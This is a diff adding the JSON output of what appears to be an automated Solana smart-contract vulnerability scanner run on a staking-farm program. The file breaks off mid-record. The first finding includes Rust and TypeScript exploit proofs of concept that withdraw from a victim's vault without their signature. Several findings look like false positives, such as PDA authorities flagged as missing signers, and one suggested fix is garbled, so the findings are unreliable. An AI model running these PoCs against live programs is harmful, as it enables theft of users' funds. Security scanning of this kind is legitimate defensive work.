@@ -1,0 +1,447 @@
+  + Phase timing:
+    Initialization: 22ms
+    Vulnerability scan: 10757ms
+    Total findings (pre-filter): 7
+[
+  {
+    "attack_scenario": "Attacker passes their own pubkey as `farm_vaults_authority`. Since there is no signer constraint, the runtime accepts the instruction and the attacker executes privileged operations.",
+    "category": "Authentication",
+    "confidence": 81,
+    "cwe": "CWE-287",
+    "description": "Field `farm_vaults_authority` in `WithdrawUnstakedDeposits` uses raw `AccountInfo<'info>` without `Signer<'info>` or `#[account(signer)]`. Any pubkey can be passed as this account — the Solana runtime will NOT enforce signing. This allows unauthorized access to privileged operations. [found in 13 locations; also in: handler_withdraw_treasury.rs:WithdrawTreasury, handler_withdraw_slashed_amount.rs:WithdrawSlashedAmount, handler_withdraw_reward.rs:WithdrawReward, handler_withdraw_from_farm_vault.rs:WithdrawFromFarmVault, handler_update_second_delegated_authority.rs:UpdateSecondDelegatedAuthority, handler_transfer_ownership.rs:TransferOwnership, handler_initialize_user.rs:InitializeUser, handler_initialize_reward.rs:InitializeReward, handler_initialize_farm_delegated.rs:InitializeFarmDelegated, handler_initialize_farm.rs:InitializeFarm, handler_harvest_reward.rs:HarvestReward, handler_add_reward.rs:AddReward]",
+    "fix": {
+      "diff": "- pub farm_vaults_authority: AccountInfo<'info>,\n+ #[derive(Accounts)]",
+      "explanation": "Apply the 'Signer Validation' pattern: Validates account is a signer",
+      "fixed_code": "\n#[derive(Accounts)]\npub struct SecureAccounts<'info> {\n    #[account(mut)]\n    pub authority: Signer<'info>,\n    // ... other accounts\n}\n",
+      "original_code": "pub farm_vaults_authority: AccountInfo<'info>,",
+      "vulnerability_id": "SOL-001"
+    },
+    "function_name": "WithdrawUnstakedDeposits",
+    "id": "SOL-001",
+    "line_number": 87,
+    "location": "handler_withdraw_unstaked_deposits.rs",
+    "poc": {
+      "attack_steps": [
+        {
+          "action_type": "Setup",
+          "code_snippet": "pub farm_vaults_authority: AccountInfo<'info>,",
+          "description": "Identify the vulnerable instruction that doesn't verify signer",
+          "step_number": 1
+        },
+        {
+          "action_type": "Transaction",
+          "code_snippet": null,
+          "description": "Craft transaction with victim's authority but without their signature",
+          "step_number": 2
+        },
+        {
+          "action_type": "Exploitation",
+          "code_snippet": null,
+          "description": "Submit transaction - only attacker signs",
+          "step_number": 3
+        },
+        {
+          "action_type": "Extraction",
+          "code_snippet": null,
+          "description": "Funds transferred to attacker's account",
+          "step_number": 4
+        }
+      ],
+      "difficulty": "Trivial",
+      "economic_impact": "CRITICAL - Complete vault/account drainage possible",
+      "expected_outcome": "Attacker can perform actions on behalf of any authority without their consent",
+      "mitigations": [
+        "Add Signer<'info> constraint to authority account",
+        "Use #[account(signer)] macro for Anchor programs",
+        "Verify ctx.accounts.authority.is_signer in handler"
+      ],
+      "prerequisites": [
+        "Knowledge of victim's public key",
+        "Program ID and IDL"
+      ],
+      "rust_poc": "// Rust PoC for SOL-001: Missing Signer Check\nuse solana_sdk::{\n    instruction::{AccountMeta, Instruction},\n    pubkey::Pubkey,\n    signature::Keypair,\n    signer::Signer,\n    transaction::Transaction,\n};\n\npub fn exploit_missing_signer(\n    program_id: &Pubkey,\n    victim_authority: &Pubkey,\n    attacker: &Keypair,\n    vault: &Pubkey,\n) -> Instruction {\n    // Craft instruction with victim's authority but without their signature\n    Instruction {\n        program_id: *program_id,\n        accounts: vec![\n            AccountMeta::new(*vault, false),       // Vault (writable)\n            AccountMeta::new_readonly(*victim_authority, false), // Authority (NOT signer!)\n            AccountMeta::new(attacker.pubkey(), true), // Attacker's account\n        ],\n        data: vec![/* WithdrawUnstakedDeposits instruction discriminator + withdraw amount */],\n    }\n}",
+      "scenario_name": "SOL-001: Missing Signer Check in WithdrawUnstakedDeposits",
+      "typescript_poc": "import * as anchor from \"@coral-xyz/anchor\";\nimport { expect } from \"chai\";\n\ndescribe(\"SOL-001 Exploit: Missing Signer Check\", () => {\n  const provider = anchor.AnchorProvider.env();\n  anchor.setProvider(provider);\n  \n  it(\"allows unauthorized action without proper signer\", async () => {\n    const attacker = anchor.web3.Keypair.generate();\n    const victim = anchor.web3.Keypair.generate();\n    \n    // Airdrop SOL to attacker\n    await provider.connection.requestAirdrop(\n      attacker.publicKey,\n      anchor.web3.LAMPORTS_PER_SOL\n    );\n    \n    // Setup: Victim deposits funds\n    const victimVault = anchor.web3.Keypair.generate();\n    // ... initialize vault with victim's funds ...\n    \n    // EXPLOIT: Attacker calls WithdrawUnstakedDeposits without being the authority signer\n    const tx = await program.methods\n      .WithdrawUnstakedDeposits(new anchor.BN(1_000_000_000)) // Drain amount\n      .accounts({\n        vault: victimVault.publicKey,\n        authority: victim.publicKey, // Victim's authority (NOT signing!)\n        destination: attacker.publicKey,\n        systemProgram: anchor.web3.SystemProgram.programId,\n      })\n      .signers([attacker]) // Only attacker signs, not victim!\n      .rpc();\n    \n    console.log(\"Exploit TX:\", tx);\n    \n    // Verify: Funds were stolen\n    const attackerBalance = await provider.connection.getBalance(attacker.publicKey);\n    expect(attackerBalance).to.be.greaterThan(anchor.web3.LAMPORTS_PER_SOL);\n  });\n});",
+      "vulnerability_id": "SOL-001"
+    },
+    "prevention": "Always use Signer<'info> for authority accounts.",
+    "real_world_incident": {
+      "date": "2022-02-02",
+      "loss": "$320M",
+      "project": "Wormhole"
+    },
+    "secure_fix": "Change `pub farm_vaults_authority: AccountInfo<'info>` to `pub farm_vaults_authority: Signer<'info>`, or add `#[account(signer)]`.",
+    "severity": 5,
+    "severity_label": "CRITICAL",
+    "simulation": {
+      "rpc": "https://api.devnet.solana.com",
+      "simulate_only": true,
+      "status": "simulated",
+      "summary": "Simulated MissingSignerCheck exploit for SOL-001 (Missing Signer Check). Config: RPC=https://api.devnet.solana.com, simulate_only=true, compute_budget=200000"
+    },
+    "vuln_type": "Missing Signer Check",
+    "vulnerable_code": "pub farm_vaults_authority: AccountInfo<'info>,"
+  },
+  {
+    "attack_scenario": "",
+    "category": "Type Safety",
+    "confidence": 71,
+    "cwe": "CWE-345",
+    "description": "Raw `AccountInfo<'info>` field 'new_second_delegated_authority' in 'update_second_delegated_authority' has no `/// CHECK:` documentation and no Anchor constraints. Anchor will not validate the account type, owner, or data layout — any account can be substituted. This is the primary vector for account confusion attacks (Cashio $48M exploit, Wormhole $320M exploit). [found in 2 locations; also in: handler_transfer_ownership.rs:transfer_ownership]",
+    "function_name": "update_second_delegated_authority",
+    "id": "SOL-076",
+    "line_number": 37,
+    "location": "handlers/handler_update_second_delegated_authority.rs",
+    "poc": {
+      "attack_steps": [
+        {
+          "action_type": "Setup",
+          "code_snippet": "36: \n37:     pub new_second_delegated_authority: AccountInfo<'info>,\n38: }",
+          "description": "Analyze vulnerable function: update_second_delegated_authority",
+          "step_number": 1
+        },
+        {
+          "action_type": "Transaction",
+          "code_snippet": null,
+          "description": "Construct malicious transaction",
+          "step_number": 2
+        },
+        {
+          "action_type": "Exploitation",
+          "code_snippet": null,
+          "description": "Execute exploit and extract value",
+          "step_number": 3
+        }
+      ],
+      "difficulty": "Trivial",
+      "economic_impact": "CRITICAL - Severe financial impact",
+      "expected_outcome": "Vulnerability exploited: Raw `AccountInfo<'info>` field 'new_second_delegated_authority' in 'update_second_delegated_authority' has no `/// CHECK:` documentation and no Anchor constraints. Anchor will not validate the account type, owner, or data layout — any account can be substituted. This is the primary vector for account confusion attacks (Cashio $48M exploit, Wormhole $320M exploit). [found in 2 locations; also in: handler_transfer_ownership.rs:transfer_ownership]",
+      "mitigations": [
+        ""
+      ],
+      "prerequisites": [
+        "Access to handlers/handler_update_second_delegated_authority.rs"
+      ],
+      "rust_poc": null,
+      "scenario_name": "SOL-076: Account Type Confusion",
+      "typescript_poc": null,
+      "vulnerability_id": "SOL-076"
+    },
+    "prevention": "",
+    "real_world_incident": null,
+    "secure_fix": "Replace `AccountInfo<'info>` with a typed Anchor wrapper:\n• `Account<'info, MyData>` — validates owner + deserializes data\n• `Program<'info, MyProgram>` — validates program ID\n• `Signer<'info>` — validates is_signer flag\n• `SystemAccount<'info>` — validates System Program ownership\nIf raw access is truly needed, add `/// CHECK: <justification>` documenting why this is safe.",
+    "severity": 5,
+    "severity_label": "Critical",
+    "simulation": {
+      "rpc": "https://api.devnet.solana.com",
+      "simulate_only": true,
+      "status": "simulated",
+      "summary": "Simulated AccountConfusion exploit for SOL-076 (Account Type Confusion). Config: RPC=https://api.devnet.solana.com, simulate_only=true, compute_budget=200000"
+    },
+    "vuln_type": "Account Type Confusion",
+    "vulnerable_code": "36: \n37:     pub new_second_delegated_authority: AccountInfo<'info>,\n38: }"
+  },
+  {
+    "attack_scenario": "DEX records a deposit of 100 tokens, but Token2022 deducted a 2% fee. Only 98 tokens arrived. User withdraws 100, draining the pool of 2 extra tokens per transaction.",
+    "category": "Token2022 Security",
+    "confidence": 65,
+    "cwe": "CWE-682",
+    "description": "Token2022 tokens with the TransferFee extension deduct fees automatically during transfer. If the program assumes the recipient receives the full amount, accounting will be incorrect.",
+    "function_name": "process",
+    "id": "SOL-056",
+    "line_number": 21,
+    "location": "handler_add_reward.rs",
+    "poc": {
+      "attack_steps": [
+        {
+          "action_type": "Setup",
+          "code_snippet": "/* ACCOUNTS_STRUCT: AddReward */\n#[derive (Accounts)] #[instruction (amount : u64 , reward_index : u64)] pub struct AddReward < 'info> { #[account (mut)] pub payer : Signer<'info> , #[account (mut)] pub farm_state : AccountLoader<'info, FarmState > , pub reward_mint : Box<InterfaceAccount<'info, MintInterface > > , #[account (mut, token :: mint = reward_mint , token :: authority = farm_vaults_authority , token :: token_program = token_program , constraint = reward_vault . key () == farm_state . load () ?. reward_infos [reward_index as usize] . rewards_vault ,)] pub reward_vault : Box<InterfaceAccount<'info, TokenAccountInterface > > , #[doc = \" CHECK: authority\"] #[account (seeds = [BASE_SEED_FARM_VAULTS_AUTHORITY , farm_state . key () . as_ref ()] , bump ,)] pub farm_vaults_authority : AccountInfo<'info> , #[account (mut, token :: token_program = token_program , constraint = payer_reward_token_ata . mint == reward_mint . key () @ FarmError :: RewardAtaRewardMintMissmatch , constraint = payer_reward_token_ata . owner == payer . key () @ FarmError :: RewardAtaOwnerNotPayer ,)] pub payer_reward_token_ata : Box<InterfaceAccount<'info, TokenAccountInterface > > , #[doc = \" CHECK: Farm checks this\"] pub scope_prices : Option<AccountLoader<'info, scope :: OraclePrices > > , pub token_program : Interface<'info, TokenInterface > , }\n/* HANDLER: */\npub fn process (ctx : Context<AddReward > , amount : u64 , reward_index : u64) -> Result<() > { check_remaining_accounts (& ctx) ? ; validate_reward_token_extensions (& ctx . accounts . reward_mint . to_account_info ()) ? ; let farm_state = & mut ctx . accounts . farm_state . load_mut () ? ; let time_unit = farm_state . time_unit ; let reward_mint = & mut ctx . accounts . reward_mint ; let scope_price = load_scope_price (& ctx . accounts . scope_prices , farm_state) ? ; msg ! (\"AddReward farm_state {:?} amount {}, reward_index {} ts {}\" , ctx . accounts . farm_state . key () , amount , reward_index , TimeUnit :: now_from_clock (time_unit , & Clock :: get () ?)) ; let AddRewardEffects { reward_amount } = farm_operations :: add_reward (farm_state , scope_price , reward_mint . key () , reward_index as usize , amount , TimeUnit :: now_from_clock (time_unit , & Clock :: get () ?) ,) ? ; msg ! (\"add {} to reward {:?} index {}\" , reward_amount , reward_mint . key () , reward_index) ; token_2022 :: transfer_checked (CpiContext :: new (ctx . accounts . token_program . to_account_info () , token_2022 :: TransferChecked { from : ctx . accounts . payer_reward_token_ata . to_account_info () . clone () , to : ctx . accounts . reward_vault . to_account_info () . clone () , authority : ctx . accounts . payer . to_account_info () . clone () , mint : ctx . accounts . reward_mint . to_account_info () . clone () , } ,) , reward_amount , ctx . accounts . reward_mint . decimals ,) ? ; Ok (()) }",
+          "description": "Analyze vulnerable function: process",
+          "step_number": 1
+        },
+        {
+          "action_type": "Transaction",
+          "code_snippet": null,
+          "description": "Construct malicious transaction",
+          "step_number": 2
+        },
+        {
+          "action_type": "Exploitation",
+          "code_snippet": null,
+          "description": "Execute exploit and extract value",
+          "step_number": 3
+        }
+      ],
+      "difficulty": "Easy",
+      "economic_impact": "HIGH - Significant financial impact",
+      "expected_outcome": "Vulnerability exploited: Token2022 tokens with the TransferFee extension deduct fees automatically during transfer. If the program assumes the recipient receives the full amount, accounting will be incorrect.",
+      "mitigations": [
+        "Always check mint extensions before transfers. Account for fees by comparing pre/post balances or querying the fee config."
+      ],
+      "prerequisites": [
+        "Access to handler_add_reward.rs"
+      ],
+      "rust_poc": null,
+      "scenario_name": "SOL-056: Transfer Fee Accounting Mismatch",
+      "typescript_poc": null,
+      "vulnerability_id": "SOL-056"
+    },
+    "prevention": "Always check mint extensions before transfers. Account for fees by comparing pre/post balances or querying the fee config.",
+    "real_world_incident": null,
+    "secure_fix": "Query the TransferFee extension: `get_epoch_fee(&mint_data, epoch)` to calculate the actual received amount. Use post-transfer balance checks.",
+    "severity": 4,
+    "severity_label": "HIGH",
+    "simulation": {
+      "rpc": "https://api.devnet.solana.com",
+      "simulate_only": true,
+      "status": "simulated",
+      "summary": "Simulated AccountConfusion exploit for SOL-056 (Transfer Fee Accounting Mismatch). Config: RPC=https://api.devnet.solana.com, simulate_only=true, compute_budget=200000"
+    },
+    "vuln_type": "Transfer Fee Accounting Mismatch",
+    "vulnerable_code": "/* ACCOUNTS_STRUCT: AddReward */\n#[derive (Accounts)] #[instruction (amount : u64 , reward_index : u64)] pub struct AddReward < 'info> { #[account (mut)] pub payer : Signer<'info> , #[account (mut)] pub farm_state : AccountLoader<'info, FarmState > , pub reward_mint : Box<InterfaceAccount<'info, MintInterface > > , #[account (mut, token :: mint = reward_mint , token :: authority = farm_vaults_authority , token :: token_program = token_program , constraint = reward_vault . key () == farm_state . load () ?. reward_infos [reward_index as usize] . rewards_vault ,)] pub reward_vault : Box<InterfaceAccount<'info, TokenAccountInterface > > , #[doc = \" CHECK: authority\"] #[account (seeds = [BASE_SEED_FARM_VAULTS_AUTHORITY , farm_state . key () . as_ref ()] , bump ,)] pub farm_vaults_authority : AccountInfo<'info> , #[account (mut, token :: token_program = token_program , constraint = payer_reward_token_ata . mint == reward_mint . key () @ FarmError :: RewardAtaRewardMintMissmatch , constraint = payer_reward_token_ata . owner == payer . key () @ FarmError :: RewardAtaOwnerNotPayer ,)] pub payer_reward_token_ata : Box<InterfaceAccount<'info, TokenAccountInterface > > , #[doc = \" CHECK: Farm checks this\"] pub scope_prices : Option<AccountLoader<'info, scope :: OraclePrices > > , pub token_program : Interface<'info, TokenInterface > , }\n/* HANDLER: */\npub fn process (ctx : Context<AddReward > , amount : u64 , reward_index : u64) -> Result<() > { check_remaining_accounts (& ctx) ? ; validate_reward_token_extensions (& ctx . accounts . reward_mint . to_account_info ()) ? ; let farm_state = & mut ctx . accounts . farm_state . load_mut () ? ; let time_unit = farm_state . time_unit ; let reward_mint = & mut ctx . accounts . reward_mint ; let scope_price = load_scope_price (& ctx . accounts . scope_prices , farm_state) ? ; msg ! (\"AddReward farm_state {:?} amount {}, reward_index {} ts {}\" , ctx . accounts . farm_state . key () , amount , reward_index , TimeUnit :: now_from_clock (time_unit , & Clock :: get () ?)) ; let AddRewardEffects { reward_amount } = farm_operations :: add_reward (farm_state , scope_price , reward_mint . key () , reward_index as usize , amount , TimeUnit :: now_from_clock (time_unit , & Clock :: get () ?) ,) ? ; msg ! (\"add {} to reward {:?} index {}\" , reward_amount , reward_mint . key () , reward_index) ; token_2022 :: transfer_checked (CpiContext :: new (ctx . accounts . token_program . to_account_info () , token_2022 :: TransferChecked { from : ctx . accounts . payer_reward_token_ata . to_account_info () . clone () , to : ctx . accounts . reward_vault . to_account_info () . clone () , authority : ctx . accounts . payer . to_account_info () . clone () , mint : ctx . accounts . reward_mint . to_account_info () . clone () , } ,) , reward_amount , ctx . accounts . reward_mint . decimals ,) ? ; Ok (()) }"
+  },
+  {
+    "attack_scenario": "Attacker reads the authority pubkey from the program's state, then passes that pubkey as the authority account without signing the transaction with the corresponding private key.",
+    "category": "Authorization",
+    "confidence": 64,
+    "cwe": "CWE-862",
+    "description": "Account `treasury_vault_authority` in `WithdrawTreasury` has an authority-like name but is not marked as a signer and no companion signer validates it. An attacker can pass any account as the authority without proving ownership. [found in 9 locations; also in: handler_withdraw_reward.rs:WithdrawReward, handler_update_second_delegated_authority.rs:UpdateSecondDelegatedAuthority, handler_transfer_ownership.rs:TransferOwnership, handler_initialize_user.rs:InitializeUser, handler_initialize_reward.rs:InitializeReward, handler_initialize_farm_delegated.rs:InitializeFarmDelegated, handler_initialize_farm.rs:InitializeFarm, handler_add_reward.rs:AddReward]",
+    "function_name": "WithdrawTreasury",
+    "id": "SOL-ALIAS-05",
+    "line_number": 73,
+    "location": "handler_withdraw_treasury.rs",
+    "poc": {
+      "attack_steps": [
+        {
+          "action_type": "Setup",
+          "code_snippet": "pub treasury_vault_authority: AccountInfo<'info>",
+          "description": "Analyze vulnerable function: WithdrawTreasury",
+          "step_number": 1
+        },
+        {
+          "action_type": "Transaction",
+          "code_snippet": null,
+          "description": "Construct malicious transaction",
+          "step_number": 2
+        },
+        {
+          "action_type": "Exploitation",
+          "code_snippet": null,
+          "description": "Execute exploit and extract value",
+          "step_number": 3
+        }
+      ],
+      "difficulty": "Trivial",
+      "economic_impact": "CRITICAL - Severe financial impact",
+      "expected_outcome": "Vulnerability exploited: Account `treasury_vault_authority` in `WithdrawTreasury` has an authority-like name but is not marked as a signer and no companion signer validates it. An attacker can pass any account as the authority without proving ownership. [found in 9 locations; also in: handler_withdraw_reward.rs:WithdrawReward, handler_update_second_delegated_authority.rs:UpdateSecondDelegatedAuthority, handler_transfer_ownership.rs:TransferOwnership, handler_initialize_user.rs:InitializeUser, handler_initialize_reward.rs:InitializeReward, handler_initialize_farm_delegated.rs:InitializeFarmDelegated, handler_initialize_farm.rs:InitializeFarm, handler_add_reward.rs:AddReward]",
+      "mitigations": [
+        "Always require signer verification for authority accounts."
+      ],
+      "prerequisites": [
+        "Access to handler_withdraw_treasury.rs"
+      ],
+      "rust_poc": null,
+      "scenario_name": "SOL-ALIAS-05: Authority Account Without Signer Check",
+      "typescript_poc": null,
+      "vulnerability_id": "SOL-ALIAS-05"
+    },
+    "prevention": "Always require signer verification for authority accounts.",
+    "real_world_incident": {
+      "date": "2022-02-02",
+      "loss": "$320M",
+      "project": "Wormhole Bridge"
+    },
+    "secure_fix": "Add `Signer<'info>` type or `#[account(signer)]` constraint.",
+    "severity": 5,
+    "severity_label": "CRITICAL",
+    "simulation": {
+      "rpc": "https://api.devnet.solana.com",
+      "simulate_only": true,
+      "status": "simulated",
+      "summary": "Simulated AccountConfusion exploit for SOL-ALIAS-05 (Authority Account Without Signer Check). Config: RPC=https://api.devnet.solana.com, simulate_only=true, compute_budget=200000"
+    },
+    "vuln_type": "Authority Account Without Signer Check",
+    "vulnerable_code": "pub treasury_vault_authority: AccountInfo<'info>"
+  },
+  {
+    "attack_scenario": "Program reads remaining_accounts[0] as a user's token account without checking owner. Attacker passes a token account they own, redirecting funds or spoofing identity.",
+    "category": "Account Validation",
+    "confidence": 61,
+    "cwe": "CWE-20",
+    "description": "The context uses `remaining_accounts` without validating the accounts' ownership, signer status, or expected keys. These accounts bypass Anchor's automatic validation, so ANY account can be passed. [found in 21 locations; also in: handler_withdraw_treasury.rs:process, handler_withdraw_slashed_amount.rs:process, handler_withdraw_reward.rs:process, handler_withdraw_from_farm_vault.rs:process, handler_update_second_delegated_authority.rs:process, handler_update_farm_admin.rs:process, handler_unstake.rs:process, handler_transfer_ownership.rs:process, handler_stake.rs:process, handler_set_stake_delegated.rs:process, handler_reward_user_once.rs:process, handler_refresh_user_state.rs:process, handler_refresh_farm.rs:process, handler_initialize_user.rs:process, handler_initialize_reward.rs:process, handler_initialize_farm_delegated.rs:process, handler_initialize_farm.rs:process, handler_harvest_reward.rs:process, handler_deposit_to_farm_vault.rs:process, handler_add_reward.rs:process]",
+    "function_name": "process",
+    "id": "SOL-063",
+    "line_number": 13,
+    "location": "handler_withdraw_unstaked_deposits.rs",
+    "poc": {
+      "attack_steps": [
+        {
+          "action_type": "Setup",
+          "code_snippet": "/* ACCOUNTS_STRUCT: WithdrawUnstakedDeposits */\n#[derive (Accounts)] pub struct WithdrawUnstakedDeposits < 'info> { #[account (mut)] pub owner : Signer<'info> , #[account (mut, has_one = owner , has_one = farm_state ,)] pub user_state : AccountLoader<'info, UserState > , #[account (mut, has_one = farm_vault , has_one = farm_vaults_authority ,)] pub farm_state : AccountLoader<'info, FarmState > , #[account (mut, has_one = owner , constraint = user_ata . mint == farm_state . load () ?. token . mint @ FarmError :: UserAtaFarmTokenMintMissmatch ,)] pub user_ata : Box<Account<'info, TokenAccount> > , #[account (mut, seeds = [BASE_SEED_FARM_VAULT , farm_state . key () . as_ref () , farm_state . load () ?. token . mint . as_ref ()] , bump , constraint = farm_vault . delegate . is_none () @ FarmError :: FarmVaultHasDelegate , constraint = farm_vault . close_authority . is_none () @ FarmError :: FarmVaultHasCloseAuthority ,)] pub farm_vault : Box<Account<'info, TokenAccount> > , #[doc = \" CHECK: Verified with a has_one constraint in farm pool state\"] #[account (seeds = [BASE_SEED_FARM_VAULTS_AUTHORITY , farm_state . key () . as_ref ()] , bump ,)] pub farm_vaults_authority : AccountInfo<'info> , pub token_program : Program<'info, Token> , }\n/* HANDLER: */\npub fn process (ctx : Context<WithdrawUnstakedDeposits >) -> Result<() > { check_remaining_accounts (& ctx) ? ; let farm_state = & mut ctx . accounts . farm_state . load_mut () ? ; let time_unit = farm_state . time_unit ; let user_state = & mut ctx . accounts . user_state . load_mut () ? ; require ! (! farm_state . is_delegated () , FarmError :: FarmDelegated) ; let WithdrawEffects { amount_to_withdraw } = farm_operations :: withdraw_unstaked_deposits (farm_state , user_state , TimeUnit :: now_from_clock (time_unit , & Clock :: get () ?) ,) ? ; let farm_state_key = ctx . accounts . farm_state . key () ; let signer_seeds : & [& [& [u8]]] = gen_signer_seeds_two ! (BASE_SEED_FARM_VAULTS_AUTHORITY , farm_state_key , farm_state . farm_vaults_authority_bump as u8) ; if amount_to_withdraw > 0 { token_operations :: transfer_from_vault (amount_to_withdraw , signer_seeds , & ctx . accounts . user_ata . to_account_info () , & ctx . accounts . farm_vault . to_account_info () , & ctx . accounts . farm_vaults_authority , & ctx . accounts . token_program ,) ? ; } Ok (()) }",
+          "description": "Analyze vulnerable function: process",
+          "step_number": 1
+        },
+        {
+          "action_type": "Transaction",
+          "code_snippet": null,
+          "description": "Construct malicious transaction",
+          "step_number": 2
+        },
+        {
+          "action_type": "Exploitation",
+          "code_snippet": null,
+          "description": "Execute exploit and extract value",
+          "step_number": 3
+        }
+      ],
+      "difficulty": "Easy",
+      "economic_impact": "HIGH - Significant financial impact",
+      "expected_outcome": "Vulnerability exploited: The context uses `remaining_accounts` without validating the accounts' ownership, signer status, or expected keys. These accounts bypass Anchor's automatic validation, so ANY account can be passed. [found in 21 locations; also in: handler_withdraw_treasury.rs:process, handler_withdraw_slashed_amount.rs:process, handler_withdraw_reward.rs:process, handler_withdraw_from_farm_vault.rs:process, handler_update_second_delegated_authority.rs:process, handler_update_farm_admin.rs:process, handler_unstake.rs:process, handler_transfer_ownership.rs:process, handler_stake.rs:process, handler_set_stake_delegated.rs:process, handler_reward_user_once.rs:process, handler_refresh_user_state.rs:process, handler_refresh_farm.rs:process, handler_initialize_user.rs:process, handler_initialize_reward.rs:process, handler_initialize_farm_delegated.rs:process, handler_initialize_farm.rs:process, handler_harvest_reward.rs:process, handler_deposit_to_farm_vault.rs:process, handler_add_reward.rs:process]",
+      "mitigations": [
+        "Minimize remaining_accounts usage. When required, validate each account's owner, key, and writable/signer constraints explicitly."
+      ],
+      "prerequisites": [
+        "Access to handler_withdraw_unstaked_deposits.rs"
+      ],
+      "rust_poc": null,
+      "scenario_name": "SOL-063: Unvalidated remaining_accounts",
+      "typescript_poc": null,
+      "vulnerability_id": "SOL-063"
+    },
+    "prevention": "Minimize remaining_accounts usage. When required, validate each account's owner, key, and writable/signer constraints explicitly.",
+    "real_world_incident": null,
+    "secure_fix": "Validate each remaining_account: check owner, key, signer status. Prefer typed accounts in the Accounts struct over remaining_accounts.",
+    "severity": 4,
+    "severity_label": "HIGH",
+    "simulation": {
+      "rpc": "https://api.devnet.solana.com",
+      "simulate_only": true,
+      "status": "simulated",
+      "summary": "Simulated AccountConfusion exploit for SOL-063 (Unvalidated remaining_accounts). Config: RPC=https://api.devnet.solana.com, simulate_only=true, compute_budget=200000"
+    },
+    "vuln_type": "Unvalidated remaining_accounts",
+    "vulnerable_code": "/* ACCOUNTS_STRUCT: WithdrawUnstakedDeposits */\n#[derive (Accounts)] pub struct WithdrawUnstakedDeposits < 'info> { #[account (mut)] pub owner : Signer<'info> , #[account (mut, has_one = owner , has_one = farm_state ,)] pub user_state : AccountLoader<'info, UserState > , #[account (mut, has_one = farm_vault , has_one = farm_vaults_authority ,)] pub farm_state : AccountLoader<'info, FarmState > , #[account (mut, has_one = owner , constraint = user_ata . mint == farm_state . load () ?. token . mint @ FarmError :: UserAtaFarmTokenMintMissmatch ,)] pub user_ata : Box<Account<'info, TokenAccount> > , #[account (mut, seeds = [BASE_SEED_FARM_VAULT , farm_state . key () . as_ref () , farm_state . load () ?. token . mint . as_ref ()] , bump , constraint = farm_vault . delegate . is_none () @ FarmError :: FarmVaultHasDelegate , constraint = farm_vault . close_authority . is_none () @ FarmError :: FarmVaultHasCloseAuthority ,)] pub farm_vault : Box<Account<'info, TokenAccount> > , #[doc = \" CHECK: Verified with a has_one constraint in farm pool state\"] #[account (seeds = [BASE_SEED_FARM_VAULTS_AUTHORITY , farm_state . key () . as_ref ()] , bump ,)] pub farm_vaults_authority : AccountInfo<'info> , pub token_program : Program<'info, Token> , }\n/* HANDLER: */\npub fn process (ctx : Context<WithdrawUnstakedDeposits >) -> Result<() > { check_remaining_accounts (& ctx) ? ; let farm_state = & mut ctx . accounts . farm_state . load_mut () ? ; let time_unit = farm_state . time_unit ; let user_state = & mut ctx . accounts . user_state . load_mut () ? ; require ! (! farm_state . is_delegated () , FarmError :: FarmDelegated) ; let WithdrawEffects { amount_to_withdraw } = farm_operations :: withdraw_unstaked_deposits (farm_state , user_state , TimeUnit :: now_from_clock (time_unit , & Clock :: get () ?) ,) ? ; let farm_state_key = ctx . accounts . farm_state . key () ; let signer_seeds : & [& [& [u8]]] = gen_signer_seeds_two ! (BASE_SEED_FARM_VAULTS_AUTHORITY , farm_state_key , farm_state . farm_vaults_authority_bump as u8) ; if amount_to_withdraw > 0 { token_operations :: transfer_from_vault (amount_to_withdraw , signer_seeds , & ctx . accounts . user_ata . to_account_info () , & ctx . accounts . farm_vault . to_account_info () , & ctx . accounts . farm_vaults_authority , & ctx . accounts . token_program ,) ? ; } Ok (()) }"
+  },
+  {
+    "attack_scenario": "",
+    "category": "Input Validation",
+    "confidence": 61,
+    "cwe": "CWE-20",
+    "description": "`remaining_accounts` accessed at line 9 without visible validation. Remaining accounts bypass Anchor's automatic validation — an attacker can inject arbitrary accounts to manipulate instruction logic, substitute token accounts, or inject malicious program IDs for CPI.",
+    "function_name": "check_remaining_accounts<T>",
+    "id": "SOL-072",
+    "line_number": 9,
+    "location": "utils/constraints.rs",
+    "poc": {
+      "attack_steps": [
+        {
+          "action_type": "Setup",
+          "code_snippet": "pub fn check_remaining_accounts<T>(ctx: &Context<T>) -> Result<()>",
+          "description": "Analyze vulnerable function: check_remaining_accounts<T>",
+          "step_number": 1
+        },
+        {
+          "action_type": "Transaction",
+          "code_snippet": null,
+          "description": "Construct malicious transaction",
+          "step_number": 2
+        },
+        {
+          "action_type": "Exploitation",
+          "code_snippet": null,
+          "description": "Execute exploit and extract value",
+          "step_number": 3
+        }
+      ],
+      "difficulty": "Easy",
+      "economic_impact": "HIGH - Significant financial impact",
+      "expected_outcome": "Vulnerability exploited: `remaining_accounts` accessed at line 9 without visible validation. Remaining accounts bypass Anchor's automatic validation — an attacker can inject arbitrary accounts to manipulate instruction logic, substitute token accounts, or inject malicious program IDs for CPI.",
+      "mitigations": [
+        ""
+      ],
+      "prerequisites": [
+        "Access to utils/constraints.rs"
+      ],
+      "rust_poc": null,
+      "scenario_name": "SOL-072: Unchecked Remaining Accounts",
+      "typescript_poc": null,
+      "vulnerability_id": "SOL-072"
+    },
+    "prevention": "",
+    "real_world_incident": null,
+    "secure_fix": "Validate each remaining account before use:\n• Check owner: `require!(acc.owner == &expected_program_id)`\n• Check key: `require_keys_eq!(acc.key(), expected_key)`\n• Deserialize with type check: `Account::<TokenAccount>::try_from(acc)?`\n• Or move accounts into the Anchor `#[derive(Accounts)]` struct",
+    "severity": 4,
+    "severity_label": "High",
+    "simulation": {
+      "rpc": "https://api.devnet.solana.com",
+      "simulate_only": true,
+      "status": "simulated",
+      "summary": "Simulated AccountConfusion exploit for SOL-072 (Unchecked Remaining Accounts). Config: RPC=https://api.devnet.solana.com, simulate_only=true, compute_budget=200000"
+    },
+    "vuln_type": "Unchecked Remaining Accounts",
+    "vulnerable_code": "pub fn check_remaining_accounts<T>(ctx: &Context<T>) -> Result<()>"
+  },
+  {
+    "attack_scenario": "Attacker creates an account with crafted data that mimics the expected layout. Without discriminator checking, the program interprets this data as valid, leading to unauthorized operations.",
+    "category": "Account Safety",
+    "confidence": 59,
+    "cwe": "CWE-704",
+    "description": "Account `new_second_delegated_authority` in `UpdateSecondDelegatedAuthority` uses raw `AccountInfo` which provides no type safety or discriminator checking. The account data can contain anything — including data from a completely different program. [found in 3 locations; also in: handler_transfer_ownership.rs:TransferOwnership, handler_initialize_reward.rs:InitializeReward]",
+    "function_name": "UpdateSecondDelegatedAuthority",
+    "id": "SOL-ALIAS-02",
+    "line_number": 37,
